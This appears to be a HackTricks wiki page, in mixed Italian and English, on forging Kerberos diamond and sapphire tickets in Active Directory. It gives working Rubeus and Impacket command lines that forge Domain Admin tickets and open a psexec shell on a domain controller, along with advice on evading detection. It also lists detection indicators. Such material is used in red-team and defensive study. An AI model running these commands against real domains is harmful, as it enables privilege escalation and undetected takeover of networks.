# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**Like a golden ticket**, a diamond ticket is a TGT which can be used to **access any service as any user**. Un golden ticket viene creato completamente offline, criptato con l'hash krbtgt di quel dominio, e poi iniettato in una sessione di logon per l'uso. Poiché i domain controller non tracciano i TGT che essi (o altri) hanno emesso legittimamente, accetteranno senza problemi TGT criptati con il proprio hash krbtgt.

There are two common techniques to detect the use of golden tickets:

- Cercare TGS-REQs che non hanno una corrispondente AS-REQ.
- Cercare TGT che hanno valori strani, come il tempo di vita predefinito di 10 anni di Mimikatz.

A **diamond ticket** is made by **modifying the fields of a legitimate TGT that was issued by a DC**. Questo si ottiene **richiedendo** un **TGT**, **decifrando** il TGT con l'hash krbtgt del dominio, **modificando** i campi desiderati del ticket, quindi **ri-crittografandolo**. Questo **supera i due limiti sopracitati** di un golden ticket perché:

- Le TGS-REQs avranno una AS-REQ precedente.
- Il TGT è stato emesso da un DC il che significa che avrà tutti i dettagli corretti dalla Kerberos policy del dominio. Anche se questi possono essere accuratamente falsificati in un golden ticket, è più complesso e soggetto a errori.

### Requisiti & flusso di lavoro

- **Materiale crittografico**: la chiave krbtgt AES256 (preferita) o l'hash NTLM per decifrare e risignare il TGT.
- **Blob TGT legittimo**: ottenuto con `/tgtdeleg`, `asktgt`, `s4u`, o esportando i ticket dalla memoria.
- **Dati di contesto**: il RID dell'utente target, i RID/SID dei gruppi, e (opzionalmente) attributi PAC derivati da LDAP.
- **Chiavi del servizio** (only if you plan to re-cut service tickets): chiave AES dello SPN del servizio da impersonare.

1. Ottenere un TGT per un qualsiasi utente controllato tramite AS-REQ (Rubeus `/tgtdeleg` è comodo perché costringe il client a eseguire la Kerberos GSS-API dance senza credenziali).
2. Decifrare il TGT restituito con la chiave krbtgt, modificare gli attributi PAC (utente, gruppi, informazioni di logon, SID, device claims, ecc.).
3. Ri-crittografare/firmare il ticket con la stessa chiave krbtgt e iniettarlo nella sessione di logon corrente (`kerberos::ptt`, `Rubeus.exe ptt`...).
4. Facoltativamente, ripetere il processo su un service ticket fornendo un blob TGT valido più la chiave del servizio target per restare stealthy sulla rete.

### Updated Rubeus tradecraft (2024+)

Lavori recenti di Huntress hanno modernizzato l'azione `diamond` all'interno di Rubeus portando le migliorie di `/ldap` e `/opsec` che prima esistevano solo per golden/silver tickets. `/ldap` ora estrae il contesto PAC reale interrogando LDAP **e** montando SYSVOL per ottenere attributi account/gruppo oltre alla Kerberos/password policy (es., `GptTmpl.inf`), mentre `/opsec` fa sì che il flusso AS-REQ/AS-REP corrisponda a Windows eseguendo lo scambio di preauth in due fasi e imponendo AES-only + realistic KDCOptions. Ciò riduce drasticamente indicatori evidenti come campi PAC mancanti o tempi di vita non corrispondenti alla policy.
```powershell
# Query RID/context data (PowerView/SharpView/AD modules all work)
Get-DomainUser -Identity <username> -Properties objectsid | Select-Object samaccountname,objectsid

# Craft a high-fidelity diamond TGT and inject it
./Rubeus.exe diamond /tgtdeleg \
/ticketuser:svc_sql /ticketuserid:1109 \
/groups:512,519 \
/krbkey:<KRBTGT_AES256_KEY> \
/ldap /ldapuser:MARVEL\loki /ldappassword:Mischief$ \
/opsec /nowrap
```
- `/ldap` (with optional `/ldapuser` & `/ldappassword`) interroga AD e SYSVOL per replicare i dati della policy PAC dell'utente target.
- `/opsec` forza un ritentativo AS-REQ in stile Windows, azzerando flag rumorosi e mantenendo AES256.
- `/tgtdeleg` ti tiene lontano dalla cleartext password o dalla chiave NTLM/AES della vittima, restituendo comunque un TGT decifrabile.

### Service-ticket recutting

Lo stesso aggiornamento di Rubeus ha aggiunto la possibilità di applicare la tecnica diamond ai blob TGS. Fornendo a `diamond` una **base64-encoded TGT** (da `asktgt`, `/tgtdeleg`, o un TGT precedentemente forged), lo **service SPN**, e la **service AES key**, puoi generare realistic service tickets senza toccare il KDC—di fatto un silver ticket più stealth.
```powershell
./Rubeus.exe diamond \
/ticket:<BASE64_TGT_OR_KRB-CRED> \
/service:cifs/dc01.lab.local \
/servicekey:<AES256_SERVICE_KEY> \
/ticketuser:svc_sql /ticketuserid:1109 \
/ldap /opsec /nowrap
```
This workflow is ideal when you already control a service account key (e.g., dumped with `lsadump::lsa /inject` or `secretsdump.py`) and want to cut a one-off TGS that perfectly matches AD policy, timelines, and PAC data without issuing any new AS/TGS traffic.

### Sapphire-style PAC swaps (2025)

Una variante più recente, talvolta chiamata **sapphire ticket**, combina la base "real TGT" di Diamond con **S4U2self+U2U** per rubare un PAC privilegiato e inserirlo nel proprio TGT. Anziché inventare SIDs aggiuntivi, si richiede un U2U S4U2self ticket per un utente ad alto privilegio in cui lo `sname` punta al richiedente a basso privilegio; la KRB_TGS_REQ trasporta il TGT del richiedente in `additional-tickets` e imposta `ENC-TKT-IN-SKEY`, permettendo al service ticket di essere decifrato con la chiave di quell'utente. Si estrae quindi il PAC privilegiato e lo si innesta nel proprio TGT legittimo prima di rifirmarlo con la chiave krbtgt.

Impacket's `ticketer.py` now ships sapphire support via `-impersonate` + `-request` (live KDC exchange):
```bash
python3 ticketer.py -request -impersonate 'DAuser' \
-domain 'lab.local' -user 'lowpriv' -password 'Passw0rd!' \
-aesKey '<krbtgt_aes256>' -domain-sid 'S-1-5-21-111-222-333'
# inject resulting .ccache
export KRB5CCNAME=lowpriv.ccache
python3 psexec.py lab.local/DAuser@dc.lab.local -k -no-pass
```
- `-impersonate` accetta un username o SID; `-request` richiede credenziali utente live più il materiale chiave krbtgt (AES/NTLM) per decriptare/patchare i ticket.

Key OPSEC tells when using this variant:

- TGS-REQ will carry `ENC-TKT-IN-SKEY` and `additional-tickets` (the victim TGT) — raro nel traffico normale.
- `sname` spesso corrisponde all'utente che richiede (accesso self-service) e Event ID 4769 mostra chiamante e target come lo stesso SPN/utente.
- Aspettati voci 4768/4769 abbinate con lo stesso computer client ma CNAMES diversi (richiedente a basso privilegio vs. proprietario PAC con privilegi).

### Note OPSEC e di rilevamento

- Le euristiche tradizionali dei cacciatori (TGS without AS, decade-long lifetimes) si applicano ancora ai golden tickets, ma diamond tickets emergono principalmente quando il **contenuto del PAC o la mappatura dei gruppi risultano impossibili**. Compila ogni campo del PAC (orari di accesso, percorsi profilo utente, ID del dispositivo) in modo che le comparazioni automatiche non segnalino immediatamente la falsificazione.
- **Non assegnare in eccesso gruppi/RID**. Se ti servono solo `512` (Domain Admins) e `519` (Enterprise Admins), fermati lì e assicurati che l'account target appartenga plausibilmente a quei gruppi altrove in AD. `ExtraSids` eccessivi sono un indizio.
- Gli scambi in stile Sapphire lasciano impronte U2U: `ENC-TKT-IN-SKEY` + `additional-tickets` oltre a un `sname` che punta a un utente (spesso il richiedente) nel 4769, e un successivo logon 4624 proveniente dal ticket contraffatto. Correlate quei campi invece di cercare solo lacune no-AS-REQ.
- Microsoft ha iniziato a eliminare gradualmente l'**emissione di service ticket RC4** a causa di CVE-2026-20833; imporre etypes solo AES sul KDC sia rinforza il dominio sia si allinea con gli strumenti diamond/sapphire (/opsec già forza AES). Mischiare RC4 nei PAC contraffatti risulterà sempre più evidente.
- Il progetto Splunk's Security Content distribuisce telemetria di attack-range per diamond tickets oltre a rilevazioni come *Windows Domain Admin Impersonation Indicator*, che correla sequenze insolite di Event ID 4768/4769/4624 e cambiamenti dei gruppi PAC. Riprodurre quel dataset (o generarne uno proprio con i comandi sopra) aiuta a validare la copertura del SOC per T1558.001 fornendoti al contempo logiche di allerta concrete da eludere.

## Riferimenti

- [Palo Alto Unit 42 – Precious Gemstones: The New Generation of Kerberos Attacks (2022)](https://unit42.paloaltonetworks.com/next-gen-kerberos-attacks/)
- [Core Security – Impacket: We Love Playing Tickets (2023)](https://www.coresecurity.com/core-labs/articles/impacket-we-love-playing-tickets)
- [Huntress – Recutting the Kerberos Diamond Ticket (2025)](https://www.huntress.com/blog/recutting-the-kerberos-diamond-ticket)
- [Splunk Security Content – Diamond Ticket attack data & detections (2023)](https://research.splunk.com/attack_data/be469518-9d2d-4ebb-b839-12683cd18a7c/)
- [Хабр – Теневая сторона драгоценностей: Diamond & Sapphire Ticket (2025)](https://habr.com/ru/articles/891620/)
- [Microsoft – RC4 service ticket enforcement for CVE-2026-20833](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
